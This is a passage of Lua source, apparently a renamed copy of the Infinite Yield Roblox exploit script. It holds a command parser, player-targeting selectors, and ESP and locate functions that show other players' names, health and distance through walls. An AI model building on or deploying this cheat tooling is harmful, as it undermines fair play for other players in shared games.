					str2 ..= v2
				end
			end
		end

		return str2
	end

	findCmd = function(arg)
		for _, v2 in pairs(cmds) do
			if v2.NAME:lower() == arg:lower() or FindInTable(v2.ALIAS, arg:lower()) then
				return v2
			end
		end

		return customAlias[arg:lower()]
	end

	splitString = function(arg, arg2)
		local tbl5 = {}

		if arg2 == nil then
			arg2 = ","
		end

		for match in string.gmatch(arg, "[^" .. arg2 .. "]+") do
			table.insert(tbl5, match)
		end

		return tbl5
	end

	cmdHistory = {}
	local tbl5 = {}
	local n5 = 0
	local n6 = 0

	execCmd = function(arg, arg2, arg3)
		local str2 = arg:gsub("%s+$", "")

		task.spawn(function()
			local v2 = str2
			str2 = string.gsub(str2, "\\\\", "%%BackSlash%%")
			local v3 = splitString(str2, "\\")

			for _, v4 in pairs(v3) do
				local str3 = string.gsub(v4, "%%BackSlash%%", "\\")
				local pos, pos2, pos3 = str3:find("^(%d+)%^")
				local n7, flag6

				if pos3 then
					str3 = str3:sub(pos2 + 1)
					local pos4, pos5, pos6 = str3:find("^([%d%.]+)%^")
					n7 = 0
					flag6 = false

					if pos6 then
						str3 = str3:sub(pos5 + 1)
						n7 = tonumber(pos6) or 0
					end
				else
					local pos4, pos5 = str3:find("^inf%^")
					n7 = 0
					flag6 = false

					if pos4 then
						str3 = str3:sub(pos5 + 1)
						local pos6, pos7, pos8 = str3:find("^([%d%.]+)%^")

						if pos8 then
							str3 = str3:sub(pos7 + 1)
							n7 = tonumber(pos8) or 1
							n7 = n7 > 0 and n7
							flag6 = true
							n7 = n7 or 1
						else
							n7 = 1
							flag6 = true
						end
					end
				end

				local num = tonumber(pos3 or 1)

				if str3:sub(1, 1) == "!" then
					local v5 = splitString(str3:sub(2), " ")

					if v5[1] and tbl5[v5[1]] then
						str3 = tbl5[v5[1]]
					end
				end

				local v5 = splitString(str3, " ")
				local v6 = v5[1]
				local v7 = findCmd(v6)

				if v7 then
					local v8 = getGlobal(v7.NAME)

					if v7.ALIAS and type(v7.ALIAS) == "table" then
						for _, alia in ipairs(v7.ALIAS) do
							local v9 = getGlobal(alia)

							if v8 < v9 then
								v8 = v9
							end
						end
					end

					if userRank < v8 then
						notify("권한 없음", "이 명령어를 사용할 권한이 없습니다! ❌", 3)
						return
					end

					pcall(function()
						fn(v7.NAME)
					end)

					table.remove(v5, 1)
					cargs = v5

					if not arg2 then
						arg2 = Players.LocalPlayer
					end

					if arg3 then
						if arg2 == Players.LocalPlayer then
							if cmdHistory[1] ~= v2 and v2:sub(1, 11) ~= "lastcommand" and v2:sub(1, 7) ~= "lastcmd" then
								table.insert(cmdHistory, 1, v2)
							end
						end

						if #cmdHistory > 30 then
							table.remove(cmdHistory)
						end

						tbl5[v6] = str3
					end

					local now = tick()

					if flag6 then
						while n6 < now do
							local ok, result = pcall(v7.FUNC, v5, arg2)

							if not ok and _G.IY_DEBUG then
								warn("Command Error:", v6, result)
							end

							wait(n7)
						end
					else
						for i = 1, num do
							if now >= n6 then
								local ok, result = pcall(function()
									v7.FUNC(v5, arg2)
								end)

								if not ok and _G.IY_DEBUG then
									warn("Command Error:", v6, result)
								end

								if n7 ~= 0 then
									wait(n7)
								end

								continue
							end

							break
						end
					end
				end
			end
		end)
	end

	addcmd = function(arg, arg2, arg3, arg4)
		local v2 = getGlobal(arg)

		if arg2 and type(arg2) == "table" then
			for _, v3 in ipairs(arg2) do
				local v4 = getGlobal(v3)

				if v2 < v4 then
					v2 = v4
				end
			end
		end

		cmds[#cmds + 1] = {
			NAME = arg,
			ALIAS = arg2 or {},
			FUNC = function(arg5, arg6)
				if userRank < v2 then
					notify("권한 없음", "이 명령어를 사용할 권한이 없습니다! ❌", 3)
					return
				end
				arg3(arg5, arg6)
			end,
			PLUGIN = arg4,
		}
	end

	removecmd = function(arg)
		if arg ~= " " then
			for i = #cmds, 1, -1 do
				if cmds[i].NAME == arg or FindInTable(cmds[i].ALIAS, arg) then
					table.remove(cmds, i)

					for _, child in pairs(CMDsF:GetChildren()) do
						if string.find(child.Text, "^" .. arg .. "$") or string.find(child.Text, "^" .. arg .. " ") or string.find(child.Text, " " .. arg .. "$") or string.find(child.Text, " " .. arg .. " ") then
							child.TextTransparency = 0.7

							child.MouseButton1Click:Connect(function()
								notify(child.Text, "Command has been disabled by you or a plugin")
							end)
						end
					end
				end
			end
		end
	end

	addbind = function(arg, arg2, arg3, arg4)
		if arg4 then
			binds[#binds + 1] = { COMMAND = arg, KEY = arg2, ISKEYUP = arg3, TOGGLE = arg4 }
		else
			binds[#binds + 1] = { COMMAND = arg, KEY = arg2, ISKEYUP = arg3 }
		end
	end

	addcmdtext = function(text3, arg, arg2)
		local clone = Example:Clone()
		local str2 = tostring(text3)
		local str3 = tostring(arg2)
		clone.Parent = CMDsF
		clone.Visible = false
		clone.Text = text3
		clone.Name = "PLUGIN_" .. arg
		table.insert(text1, clone)

		if arg2 and arg2 ~= "" then
			clone:SetAttribute("Title", str2)
			clone:SetAttribute("Desc", str3)

			clone.MouseButton1Down:Connect(function()
				if clone.Visible and clone.TextTransparency == 0 then
					Cmdbar:CaptureFocus()
					autoComplete(clone.Text)
					maximizeHolder()
				end
			end)
		end
	end

	local function testHasher2(data)
		local v2 = workspace.CurrentCamera:WorldToScreenPoint(data.Position)
		return Vector2.new(v2.X, v2.Y)
	end

	local function fn2()
		return Vector2.new(IYMouse.X, IYMouse.Y)
	end

	local function getHwid3()
		local huge = math.huge
		local v2 = nil

		for _, player in pairs(Players:GetPlayers()) do
			if player ~= Players.LocalPlayer and player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
				for _, child in pairs(player.Character:GetChildren()) do
					if string.find(child.Name, "Torso") then
						local magnitude = (testHasher2(child) - fn2()).Magnitude

						if magnitude < huge then
							huge = magnitude
							v2 = player
						end
					end
				end
			end
		end

		return v2
	end

	SpecialPlayerCases = {
		all = function()
			return Players:GetPlayers()
		end,
		others = function(arg)
			local tbl6 = {}

			for _, player in pairs(Players:GetPlayers()) do
				if player ~= arg then
					table.insert(tbl6, player)
				end
			end

			return tbl6
		end,
		me = function(arg)
			return { arg }
		end,
		["#(%d+)"] = function(arg, arg2, arg3)
			local tbl6 = {}
			local num = tonumber(arg2[1])
			local tbl7 = { unpack(arg3) }

			for i = 1, num do
				if #tbl7 ~= 0 then
					local n7 = math.random(1, #tbl7)
					table.insert(tbl6, tbl7[n7])
					table.remove(tbl7, n7)
					continue
				end

				break
			end

			return tbl6
		end,
		random = function()
			local players = Players:GetPlayers()
			table.remove(players, table.find(players, Players.LocalPlayer))
			return { players[math.random(1, #players)] }
		end,
		["%%(.+)"] = function(arg, arg2)
			local tbl6 = {}
			local v2 = arg2[1]

			for _, player in pairs(Players:GetPlayers()) do
				if player.Team and string.sub(string.lower(player.Team.Name), 1, #v2) == string.lower(v2) then
					table.insert(tbl6, player)
				end
			end

			return tbl6
		end,
		allies = function(arg)
			local tbl6 = {}
			local team = arg.Team

			for _, player in pairs(Players:GetPlayers()) do
				if player.Team == team then
					table.insert(tbl6, player)
				end
			end

			return tbl6
		end,
		enemies = function(arg)
			local tbl6 = {}
			local team = arg.Team

			for _, player in pairs(Players:GetPlayers()) do
				if player.Team ~= team then
					table.insert(tbl6, player)
				end
			end

			return tbl6
		end,
		team = function(arg)
			local tbl6 = {}
			local team = arg.Team

			for _, player in pairs(Players:GetPlayers()) do
				if player.Team == team then
					table.insert(tbl6, player)
				end
			end

			return tbl6
		end,
		nonteam = function(arg)
			local tbl6 = {}
			local team = arg.Team

			for _, player in pairs(Players:GetPlayers()) do
				if player.Team ~= team then
					table.insert(tbl6, player)
				end
			end

			return tbl6
		end,
		friends = function(arg)
			local tbl6 = {}

			for _, player in pairs(Players:GetPlayers()) do
				if player:IsFriendsWith(arg.UserId) and player ~= arg then
					table.insert(tbl6, player)
				end
			end

			return tbl6
		end,
		nonfriends = function(arg)
			local tbl6 = {}

			for _, player in pairs(Players:GetPlayers()) do
				if not player:IsFriendsWith(arg.UserId) and player ~= arg then
					table.insert(tbl6, player)
				end
			end

			return tbl6
		end,
		guests = function()
			local tbl6 = {}

			for _, player in pairs(Players:GetPlayers()) do
				if player.Guest then
					table.insert(tbl6, player)
				end
			end

			return tbl6
		end,
		bacons = function()
			local tbl6 = {}

			for _, player in pairs(Players:GetPlayers()) do
				if player.Character:FindFirstChild("Pal Hair") or player.Character:FindFirstChild("Kate Hair") then
					table.insert(tbl6, player)
				end
			end

			return tbl6
		end,
		["age(%d+)"] = function(arg, arg2)
			local tbl6 = {}
			local num = tonumber(arg2[1])
			if not num == nil then
				return
			end

			for _, player in pairs(Players:GetPlayers()) do
				if player.AccountAge <= num then
					table.insert(tbl6, player)
				end
			end

			return tbl6
		end,
		nearest = function(arg, arg2, arg3)
			local character = arg.Character
			if not character or not getRoot(character) then
				return
			end
			local huge = math.huge
			local tbl6 = nil

			for _, v2 in pairs(arg3) do
				if v2 ~= arg and v2.Character then
					local v3 = v2:DistanceFromCharacter(getRoot(character).Position)

					if v3 < huge then
						tbl6 = { v2 }
						huge = v3
					end
				end
			end

			return tbl6
		end,
		farthest = function(arg, arg2, arg3)
			local character = arg.Character
			if not character or not getRoot(character) then
				return
			end
			local n7 = 0
			local tbl6 = nil

			for _, v2 in pairs(arg3) do
				if v2 ~= arg and v2.Character then
					local v3 = v2:DistanceFromCharacter(getRoot(character).Position)

					if n7 < v3 then
						tbl6 = { v2 }
						n7 = v3
					end
				end
			end

			return tbl6
		end,
		["group(%d+)"] = function(arg, arg2)
			local tbl6 = {}
			local num = tonumber(arg2[1])

			for _, player in pairs(Players:GetPlayers()) do
				if player:IsInGroup(num) then
					table.insert(tbl6, player)
				end
			end

			return tbl6
		end,
		alive = function()
			local tbl6 = {}

			for _, player in pairs(Players:GetPlayers()) do
				if player.Character and player.Character:FindFirstChildOfClass("Humanoid") and player.Character:FindFirstChildOfClass("Humanoid").Health > 0 then
					table.insert(tbl6, player)
				end
			end

			return tbl6
		end,
		dead = function()
			local tbl6 = {}

			for _, player in pairs(Players:GetPlayers()) do
				if not player.Character or not player.Character:FindFirstChildOfClass("Humanoid") or player.Character:FindFirstChildOfClass("Humanoid").Health <= 0 then
					table.insert(tbl6, player)
				end
			end

			return tbl6
		end,
		["rad(%d+)"] = function(arg, arg2)
			local tbl6 = {}
			local num = tonumber(arg2[1])
			local character = arg.Character
			if not character or not getRoot(character) then
				return
			end

			for _, player in pairs(Players:GetPlayers()) do
				if player.Character and getRoot(player.Character) then
					if (getRoot(player.Character).Position - getRoot(character).Position).magnitude <= num then
						table.insert(tbl6, player)
					end
				end
			end

			return tbl6
		end,
		cursor = function()
			local tbl6 = {}
			local hwid = getHwid3()

			if hwid ~= nil then
				table.insert(tbl6, hwid)
			end

			return tbl6
		end,
		npcs = function()
			local tbl6 = {}

			for _, descendant in pairs(workspace:GetDescendants()) do
				if descendant:IsA("Model") and getRoot(descendant) and descendant:FindFirstChildWhichIsA("Humanoid") and Players:GetPlayerFromCharacter(descendant) == nil then
					local player = Instance.new("Player")
					player.Name = descendant.Name .. " - " .. descendant:FindFirstChildWhichIsA("Humanoid").DisplayName
					player.Character = descendant
					table.insert(tbl6, player)
				end
			end

			return tbl6
		end,
	}

	toTokens = function(arg)
		local tbl6 = {}

		for match, match2 in string.gmatch(arg, "([+-])([^+-]+)") do
			table.insert(tbl6, { Operator = match, Name = match2 })
		end

		return tbl6
	end

	onlyIncludeInTable = function(arg, arg2)
		local tbl6 = {}
		local tbl7 = {}

		for _, v2 in pairs(arg2) do
			tbl6[v2.Name] = true
		end

		for _, v2 in pairs(arg) do
			if tbl6[v2.Name] then
				table.insert(tbl7, v2)
			end
		end

		return tbl7
	end

	removeTableMatches = function(arg, arg2)
		local tbl6 = {}
		local tbl7 = {}

		for _, v2 in pairs(arg2) do
			tbl6[v2.Name] = true
		end

		for _, v2 in pairs(arg) do
			if not tbl6[v2.Name] then
				table.insert(tbl7, v2)
			end
		end

		return tbl7
	end

	getPlayersByName = function(arg)
		local v2 = string.lower(arg)
		local n7 = #arg
		local tbl6 = {}

		for _, player in pairs(Players:GetPlayers()) do
			if v2:sub(0, 1) == "@" then
				if string.sub(string.lower(player.Name), 1, n7 - 1) == v2:sub(2) then
					table.insert(tbl6, player)
				end
			elseif string.sub(string.lower(player.Name), 1, n7) == v2 or string.sub(string.lower(player.DisplayName), 1, n7) == v2 then
				table.insert(tbl6, player)
			end
		end

		return tbl6
	end

	getPlayer = function(arg, arg2)
		if arg == nil then
			return { arg2.Name }
		end
		local v2 = splitString(arg, ",")
		local tbl6 = {}

		for _, v3 in pairs(v2) do
			if string.sub(v3, 1, 1) ~= "+" and string.sub(v3, 1, 1) ~= "-" then
				v3 = "+" .. v3
			end

			local v4 = toTokens(v3)
			local players = Players:GetPlayers()

			for _, v5 in pairs(v4) do
				if v5.Operator == "+" then
					local name = v5.Name
					local flag6 = false

					for k, v6 in pairs(SpecialPlayerCases) do
						local tbl7 = { string.match(name, "^" .. k .. "$") }

						if #tbl7 > 0 then
							flag6 = true
							players = onlyIncludeInTable(players, v6(arg2, tbl7, players))
						end
					end

					if not flag6 then
						players = onlyIncludeInTable(players, getPlayersByName(name))
					end
				else
					local name = v5.Name
					local flag6 = false

					for k, v6 in pairs(SpecialPlayerCases) do
						local tbl7 = { string.match(name, "^" .. k .. "$") }

						if #tbl7 > 0 then
							flag6 = true
							players = removeTableMatches(players, v6(arg2, tbl7, players))
						end
					end

					if not flag6 then
						players = removeTableMatches(players, getPlayersByName(name))
					end
				end
			end

			for _, player in pairs(players) do
				table.insert(tbl6, player)
			end
		end

		local tbl7 = {}

		for _, v3 in pairs(tbl6) do
			table.insert(tbl7, v3.Name)
		end

		return tbl7
	end

	getprfx = function(arg)
		local _prefix = prefix

		if arg:sub(1, string.len(prefix)) == _prefix then
			local tbl6 = {}
			local n7 = string.len(prefix) + 1
			tbl6[1] = "cmd"
			tbl6[2] = n7
			return tbl6
		end
	end

	do_exec = function(arg, arg2)
		local str2 = arg:gsub("/e ", "")
		local v2 = getprfx(str2)
		if not v2 then
			return
		end
		local str3 = str2:sub(v2[2])

		if v2[1] == "cmd" then
			execCmd(str3, arg2, true)
			IndexContents("", true, false, true)
			CMDsF.CanvasPosition = vector2
		end
	end

	lastTextBoxString = nil
	lastTextBoxCon = nil
	lastEnteredString = nil

	UserInputService.TextBoxFocused:Connect(function(arg)
		if lastTextBoxCon then
			lastTextBoxCon:Disconnect()
		end

		if arg == Cmdbar then
			lastTextBoxString = nil
			return
		end
		lastTextBoxString = arg.Text

		lastTextBoxCon = arg:GetPropertyChangedSignal("Text"):Connect(function()
			if not UserInputService:IsKeyDown(Enum.KeyCode.Return) and not UserInputService:IsKeyDown(Enum.KeyCode.KeypadEnter) then
				lastTextBoxString = arg.Text
			end
		end)
	end)

	UserInputService.InputBegan:Connect(function(input, gameProcessed)
		if gameProcessed then
			if Cmdbar and Cmdbar:IsFocused() then
				if input.KeyCode == Enum.KeyCode.Up then
					n5 += 1

					if #cmdHistory < n5 then
						n5 = #cmdHistory
					end

					Cmdbar.Text = cmdHistory[n5] or ""
					Cmdbar.CursorPosition = 1020
				elseif input.KeyCode == Enum.KeyCode.Down then
					n5 -= 1

					if n5 < 0 then
						n5 = 0
					end

					Cmdbar.Text = cmdHistory[n5] or ""
					Cmdbar.CursorPosition = 1020
				end
			elseif input.KeyCode == Enum.KeyCode.Return or input.KeyCode == Enum.KeyCode.KeypadEnter then
				lastEnteredString = lastTextBoxString
			end
		end
	end)

	Players.LocalPlayer.Chatted:Connect(function()
		wait()

		if lastEnteredString then
			local _lastEnteredString = lastEnteredString
			lastEnteredString = nil
			do_exec(_lastEnteredString, Players.LocalPlayer)
		end
	end)

	Cmdbar.PlaceholderText = "Command Bar (" .. prefix .. ")"

	Cmdbar:GetPropertyChangedSignal("Text"):Connect(function()
		if Cmdbar:IsFocused() then
			IndexContents(Cmdbar.Text, true, true)
		end
	end)

	local connection3 = nil
	tabAllowed = true

	Cmdbar.FocusLost:Connect(function(enterPressed)
		if enterPressed then
			execCmd(Cmdbar.Text:gsub("^" .. prefix, ""), Players.LocalPlayer, true)
		end

		if connection3 then
			connection3:Disconnect()
		end

		wait()

		if not Cmdbar:IsFocused() then
			Cmdbar.Text = ""
			IndexContents("", true, false, true)

			if flag2 == true then
				wait(0.2)
				Settings:TweenPosition(UDim2.new(0, 0, 0, 45), "InOut", "Quart", 0.2, true, nil)
				CMDsF.Visible = false
			end
		end

		CMDsF.CanvasPosition = vector2
	end)

	Cmdbar.Focused:Connect(function()
		n5 = 0
		vector2 = CMDsF.CanvasPosition

		if flag2 == true then
			wait(0.2)
			CMDsF.Visible = true
			Settings:TweenPosition(UDim2.new(0, 0, 0, 220), "InOut", "Quart", 0.2, true, nil)
		end

		connection3 = UserInputService.InputBegan:Connect(function(input)
			if Cmdbar:IsFocused() then
				if tabAllowed == true and input.KeyCode == Enum.KeyCode.Tab and text ~= nil then
					autoComplete(text)
				end
			else
				connection3:Disconnect()
			end
		end)
	end)

	ESPenabled = false
	CHMSenabled = false

	round = function(arg, arg2)
		local n7 = 10 ^ (arg2 or 0)
		return math.floor(arg * n7 + 0.5) / n7
	end

	ESP = function(arg)
		task.spawn(function()
			for _, child in pairs(COREGUI:GetChildren()) do
				if child.Name == arg.Name .. "_ESP" then
					child:Destroy()
				end
			end

			wait()

			if arg.Character and arg.Name ~= Players.LocalPlayer.Name and not COREGUI:FindFirstChild(arg.Name .. "_ESP") then
				local folder = Instance.new("Folder")
				folder.Name = arg.Name .. "_ESP"
				folder.Parent = COREGUI

				while true do
					wait(1)
					if not arg.Character or not getRoot(arg.Character) or not arg.Character:FindFirstChildOfClass("Humanoid") then
						continue
					end
					break
				end

				for _, child in pairs(arg.Character:GetChildren()) do
					if child:IsA("BasePart") then
						local boxHandleAdornment = Instance.new("BoxHandleAdornment")
						boxHandleAdornment.Name = arg.Name
						boxHandleAdornment.Parent = folder
						boxHandleAdornment.Adornee = child
						boxHandleAdornment.AlwaysOnTop = true
						boxHandleAdornment.ZIndex = 10
						boxHandleAdornment.Size = child.Size
						boxHandleAdornment.Transparency = espTransparency
						boxHandleAdornment.Color = arg.TeamColor
					end
				end

				if arg.Character and arg.Character:FindFirstChild("Head") then
					local billboardGui = Instance.new("BillboardGui")
					local textLabel = Instance.new("TextLabel")
					billboardGui.Adornee = arg.Character.Head
					billboardGui.Name = arg.Name
					billboardGui.Parent = folder
					billboardGui.Size = UDim2.new(0, 100, 0, 150)
					billboardGui.StudsOffset = Vector3.new(0, 1, 0)
					billboardGui.AlwaysOnTop = true
					textLabel.Parent = billboardGui
					textLabel.BackgroundTransparency = 1
					textLabel.Position = UDim2.new(0, 0, 0, -50)
					textLabel.Size = UDim2.new(0, 100, 0, 100)
					textLabel.Font = Enum.Font.SourceSansSemibold
					textLabel.TextSize = 20
					textLabel.TextColor3 = Color3.new(1, 1, 1)
					textLabel.TextStrokeTransparency = 0
					textLabel.TextYAlignment = Enum.TextYAlignment.Bottom
					textLabel.Text = "Name: " .. arg.Name
					textLabel.ZIndex = 10
					local connection4 = nil
					local connection5 = nil
					local connection6 = nil

					connection6 = arg.CharacterAdded:Connect(function()
						if ESPenabled then
							connection4:Disconnect()
							connection5:Disconnect()
							folder:Destroy()

							while true do
								wait(1)
								if not getRoot(arg.Character) or not arg.Character:FindFirstChildOfClass("Humanoid") then
									continue
								end
								break
							end

							ESP(arg)
							connection6:Disconnect()
						else
							connection5:Disconnect()
							connection6:Disconnect()
						end
					end)

					connection5 = arg:GetPropertyChangedSignal("TeamColor"):Connect(function()
						if ESPenabled then
							connection4:Disconnect()
							connection6:Disconnect()
							folder:Destroy()

							while true do
								wait(1)
								if not getRoot(arg.Character) or not arg.Character:FindFirstChildOfClass("Humanoid") then
									continue
								end
								break
							end

							ESP(arg)
							connection5:Disconnect()
						else
							connection5:Disconnect()
						end
					end)

					connection4 = RunService.RenderStepped:Connect(function()
						if COREGUI:FindFirstChild(arg.Name .. "_ESP") then
							if arg.Character and getRoot(arg.Character) and arg.Character:FindFirstChildOfClass("Humanoid") and Players.LocalPlayer.Character and getRoot(Players.LocalPlayer.Character) and Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
								local n7 = math.floor((getRoot(Players.LocalPlayer.Character).Position - getRoot(arg.Character).Position).magnitude)
								textLabel.Text = "Name: " .. arg.Name .. " | Health: " .. round(arg.Character:FindFirstChildOfClass("Humanoid").Health, 1) .. " | Studs: " .. n7
							end
						else
							connection5:Disconnect()
							connection6:Disconnect()
							connection4:Disconnect()
						end
					end)
				end
			end
		end)
	end

	CHMS = function(arg)
		task.spawn(function()
			for _, child in pairs(COREGUI:GetChildren()) do
				if child.Name == arg.Name .. "_CHMS" then
					child:Destroy()
				end
			end

			wait()

			if arg.Character and arg.Name ~= Players.LocalPlayer.Name and not COREGUI:FindFirstChild(arg.Name .. "_CHMS") then
				local folder = Instance.new("Folder")
				folder.Name = arg.Name .. "_CHMS"
				folder.Parent = COREGUI

				while true do
					wait(1)
					if not arg.Character or not getRoot(arg.Character) or not arg.Character:FindFirstChildOfClass("Humanoid") then
						continue
					end
					break
				end

				for _, child in pairs(arg.Character:GetChildren()) do
					if child:IsA("BasePart") then
						local boxHandleAdornment = Instance.new("BoxHandleAdornment")
						boxHandleAdornment.Name = arg.Name
						boxHandleAdornment.Parent = folder
						boxHandleAdornment.Adornee = child
						boxHandleAdornment.AlwaysOnTop = true
						boxHandleAdornment.ZIndex = 10
						boxHandleAdornment.Size = child.Size
						boxHandleAdornment.Transparency = espTransparency
						boxHandleAdornment.Color = arg.TeamColor
					end
				end

				local connection4 = nil
				local connection5 = nil
				local connection6 = nil

				connection4 = arg.CharacterAdded:Connect(function()
					if CHMSenabled then
						folder:Destroy()
						connection5:Disconnect()

						while true do
							wait(1)
							if not getRoot(arg.Character) or not arg.Character:FindFirstChildOfClass("Humanoid") then
								continue
							end
							break
						end

						CHMS(arg)
						connection4:Disconnect()
					else
						connection5:Disconnect()
						connection4:Disconnect()
					end
				end)

				connection5 = arg:GetPropertyChangedSignal("TeamColor"):Connect(function()
					if CHMSenabled then
						folder:Destroy()
						connection4:Disconnect()

						while true do
							wait(1)
							if not getRoot(arg.Character) or not arg.Character:FindFirstChildOfClass("Humanoid") then
								continue
							end
							break
						end

						CHMS(arg)
						connection5:Disconnect()
					else
						connection5:Disconnect()
					end
				end)

				connection6 = folder.AncestryChanged:Connect(function()
					connection5:Disconnect()
					connection4:Disconnect()
					connection6:Disconnect()
				end)
			end
		end)
	end

	Locate = function(arg)
		task.spawn(function()
			for _, child in pairs(COREGUI:GetChildren()) do
				if child.Name == arg.Name .. "_LC" then
					child:Destroy()
				end
			end

			wait()

			if arg.Character and arg.Name ~= Players.LocalPlayer.Name and not COREGUI:FindFirstChild(arg.Name .. "_LC") then
				local folder = Instance.new("Folder")
				folder.Name = arg.Name .. "_LC"
				folder.Parent = COREGUI

				while true do
					wait(1)
					if not arg.Character or not getRoot(arg.Character) or not arg.Character:FindFirstChildOfClass("Humanoid") then
						continue
					end
					break
				end

				for _, child in pairs(arg.Character:GetChildren()) do
					if child:IsA("BasePart") then
						local boxHandleAdornment = Instance.new("BoxHandleAdornment")
						boxHandleAdornment.Name = arg.Name
						boxHandleAdornment.Parent = folder
						boxHandleAdornment.Adornee = child
						boxHandleAdornment.AlwaysOnTop = true
						boxHandleAdornment.ZIndex = 10
						boxHandleAdornment.Size = child.Size
						boxHandleAdornment.Transparency = espTransparency
						boxHandleAdornment.Color = arg.TeamColor
					end
				end

				if arg.Character and arg.Character:FindFirstChild("Head") then
					local billboardGui = Instance.new("BillboardGui")
					local textLabel = Instance.new("TextLabel")
					billboardGui.Adornee = arg.Character.Head
					billboardGui.Name = arg.Name
					billboardGui.Parent = folder
					billboardGui.Size = UDim2.new(0, 100, 0, 150)
					billboardGui.StudsOffset = Vector3.new(0, 1, 0)
					billboardGui.AlwaysOnTop = true
					textLabel.Parent = billboardGui
					textLabel.BackgroundTransparency = 1
					textLabel.Position = UDim2.new(0, 0, 0, -50)
					textLabel.Size = UDim2.new(0, 100, 0, 100)
					textLabel.Font = Enum.Font.SourceSansSemibold
					textLabel.TextSize = 20
					textLabel.TextColor3 = Color3.new(1, 1, 1)
					textLabel.TextStrokeTransparency = 0
					textLabel.TextYAlignment = Enum.TextYAlignment.Bottom
					textLabel.Text = "Name: " .. arg.Name
					textLabel.ZIndex = 10
					local connection4 = nil
					local connection5 = nil
					local connection6 = nil

					connection5 = arg.CharacterAdded:Connect(function()
						if folder ~= nil and folder.Parent ~= nil then
							connection4:Disconnect()
							connection6:Disconnect()
							folder:Destroy()

							while true do
								wait(1)
								if not getRoot(arg.Character) or not arg.Character:FindFirstChildOfClass("Humanoid") then
									continue
								end
								break
							end

							Locate(arg)
							connection5:Disconnect()
						else
							connection6:Disconnect()
							connection5:Disconnect()
						end
					end)

					connection6 = arg:GetPropertyChangedSignal("TeamColor"):Connect(function()
						if folder ~= nil and folder.Parent ~= nil then
							connection4:Disconnect()
							connection5:Disconnect()
							folder:Destroy()

							while true do
								wait(1)
								if not getRoot(arg.Character) or not arg.Character:FindFirstChildOfClass("Humanoid") then
									continue
								end
								break
							end

							Locate(arg)
							connection6:Disconnect()
						else
							connection6:Disconnect()
						end
					end)

					connection4 = RunService.RenderStepped:Connect(function()
						if COREGUI:FindFirstChild(arg.Name .. "_LC") then
							if arg.Character and getRoot(arg.Character) and arg.Character:FindFirstChildOfClass("Humanoid") and Players.LocalPlayer.Character and getRoot(Players.LocalPlayer.Character) and Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
								local n7 = math.floor((getRoot(Players.LocalPlayer.Character).Position - getRoot(arg.Character).Position).magnitude)
								textLabel.Text = "Name: " .. arg.Name .. " | Health: " .. round(arg.Character:FindFirstChildOfClass("Humanoid").Health, 1) .. " | Studs: " .. n7
							end
						else
							connection6:Disconnect()
							connection5:Disconnect()
							connection4:Disconnect()
						end
					end)
				end
			end
		end)
	end

	local flag6 = false
	local flag7 = false

	refreshbinds = function()
		if Holder_2 then
			Holder_2:ClearAllChildren()
			Holder_2.CanvasSize = UDim2.new(0, 0, 0, 10)

			for i = 1, #binds do
				local n7 = i * 25 - 25
				local clone = Example_2:Clone()
				clone.Parent = Holder_2
				clone.Visible = true
				clone.Position = UDim2.new(0, 0, 0, n7 + 5)
				table.insert(shade2, clone)
				table.insert(shade2, clone.Text)
				table.insert(text1, clone.Text)
				table.insert(shade3, clone.Text.Delete)
				table.insert(text2, clone.Text.Delete)
				local str2 = tostring(binds[i].KEY)

				if str2 ~= "RightClick" and str2 ~= "LeftClick" then
					str2 = str2:sub(14)
				end

				if binds[i].TOGGLE then
					clone.Text.Text = str2 .. " > " .. binds[i].COMMAND .. " / " .. binds[i].TOGGLE
				else
					clone.Text.Text = str2 .. " > " .. binds[i].COMMAND .. "  " .. (binds[i].ISKEYUP and "(keyup)" or "(keydown)")
				end

				Holder_2.CanvasSize = UDim2.new(0, 0, 0, n7 + 30)

				clone.Text.Delete.MouseButton1Click:Connect(function()
					unkeybind(binds[i].COMMAND, binds[i].KEY)
				end)
			end
		end
	end

	refreshbinds()
	toggleOn = {}

	unkeybind = function(arg, arg2)
		for i = #binds, 1, -1 do
			if binds[i].COMMAND == arg and binds[i].KEY == arg2 then
				toggleOn[binds[i]] = nil
				table.remove(binds, i)
			end
		end

		refreshbinds()
		updatesaves()

		if arg2 == "RightClick" or arg2 == "LeftClick" then
			notify("Keybinds Updated", "Unbinded " .. arg2 .. " from " .. arg)
		else
			notify("Keybinds Updated", "Unbinded " .. arg2:sub(14) .. " from " .. arg)
		end
	end

	PositionsFrame.Delete.MouseButton1Click:Connect(function()
		execCmd("cpos")
	end)

	refreshwaypoints = function()
		if #WayPoints > 0 or #pWayPoints > 0 then
			PositionsHint:Destroy()
		end

		if Holder_4 then
			Holder_4:ClearAllChildren()
			Holder_4.CanvasSize = UDim2.new(0, 0, 0, 10)
			local n7 = 1

			for i = 1, #WayPoints do
				local n8 = n7 * 25 - 25
				local clone = Example_4:Clone()
				clone.Parent = Holder_4
				clone.Visible = true
				clone.Position = UDim2.new(0, 0, 0, n8 + 5)
				clone.Text.Text = WayPoints[i].NAME
				table.insert(shade2, clone)
				table.insert(shade2, clone.Text)
				table.insert(text1, clone.Text)
				table.insert(shade3, clone.Text.Delete)
				table.insert(text2, clone.Text.Delete)
				table.insert(shade3, clone.Text.TP)
				table.insert(text2, clone.Text.TP)
				Holder_4.CanvasSize = UDim2.new(0, 0, 0, n8 + 30)

				clone.Text.Delete.MouseButton1Click:Connect(function()
					execCmd("dpos " .. WayPoints[i].NAME)
				end)

				clone.Text.TP.MouseButton1Click:Connect(function()
					execCmd("loadpos " .. WayPoints[i].NAME)
				end)

				n7 += 1
			end

			for i = 1, #pWayPoints do
				local n8 = n7 * 25 - 25
				local clone = Example_4:Clone()
				clone.Parent = Holder_4
				clone.Visible = true
				clone.Position = UDim2.new(0, 0, 0, n8 + 5)
				clone.Text.Text = pWayPoints[i].NAME
				table.insert(shade2, clone)
				table.insert(shade2, clone.Text)
				table.insert(text1, clone.Text)
				table.insert(shade3, clone.Text.Delete)
				table.insert(text2, clone.Text.Delete)
				table.insert(shade3, clone.Text.TP)
				table.insert(text2, clone.Text.TP)
				Holder_4.CanvasSize = UDim2.new(0, 0, 0, n8 + 30)

				clone.Text.Delete.MouseButton1Click:Connect(function()
					execCmd("dpos " .. pWayPoints[i].NAME)
				end)

				clone.Text.TP.MouseButton1Click:Connect(function()
					execCmd("loadpos " .. pWayPoints[i].NAME)
				end)

				n7 += 1
			end
		end
	end

	refreshwaypoints()

	refreshaliases = function()
		if #aliases > 0 then
			AliasHint:Destroy()
		end

